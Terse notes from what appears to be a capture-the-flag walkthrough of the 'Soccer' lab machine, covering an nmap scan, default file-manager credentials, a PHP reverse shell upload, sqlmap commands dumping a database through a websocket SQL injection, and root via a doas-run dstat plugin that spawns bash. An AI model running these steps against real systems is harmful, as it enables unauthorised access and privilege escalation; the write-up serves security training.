#sqlmap #websocket #doas #suid
```shell
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Fri, 27 Dec 2024 10:28:30 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Fri, 27 Dec 2024 10:28:30 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.94SVN%I=7%D=12/27%Time=676E8149%P=x86_64-pc-linux-gnu%
SF:r(informix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clo
SF:se\r\n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
SF:n:\x20close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Foun
SF:d\r\nContent-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r
SF:\nContent-Length:\x20139\r\nDate:\x20Fri,\x2027\x20Dec\x202024\x2010:28
SF::30\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20
SF:lang=\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>
SF:\n</head>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%
SF:r(HTTPOptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security
SF:-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:143\r\nDate:\x20Fri,\x2027\x20Dec\x202024\x2010:28:30\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\
SF:n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<p
SF:re>Cannot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C
SF:,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20defau
SF:lt-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20F
SF:ri,\x2027\x20Dec\x202024\x2010:28:30\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset
SF:=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTI
SF:ONS\x20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTC
SF:P,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\
SF:n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:nection:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


# found an endpoint /tiny, it uses tinyfilemanager v2.4.3

# Default credentials 
admin:admin@123


# uploaded a reverse php shell

# Found soc-player.soccer.htb subdomain on /etc/nginx/sites-enabled



# soc-player.soccer.htb uses a websocket connection to check ticketid but has a blind-sql injection vulnerability,

# Intercepted all the request made from the /check


# Used sqlmap to dump the database

```shell
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"data":"*"}' --batch --level=4
# -u = websocket url
# --data = injectable payload, * replaced with the payload
# --level =  to perform more tests / payloads
# --batch = default , same with -y
sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id":"*"}' --batch --level=4 -D soccer_db -T accounts --dump

```

# dumped database credentials
player:PlayerOftheMatch2022





#  the machine uses vulnerable version of snap 
snap    2.57.6
	https://nsfocusglobal.com/snapd-local-privilege-escalation-vulnerability-cve-2022-3328/



# Found a SUID file, doas which the as sudo, it allows a file to be executed as other user


# created a python script that creates an interactive shell on the /usr/local/share/dstat/dstat_<plugin_name>.py directory
```python
import os 

os.system("/bin/bash")
```


# then invoked the doas command 
```shell
doas /usr/bin/dstat --<plugin_name>
```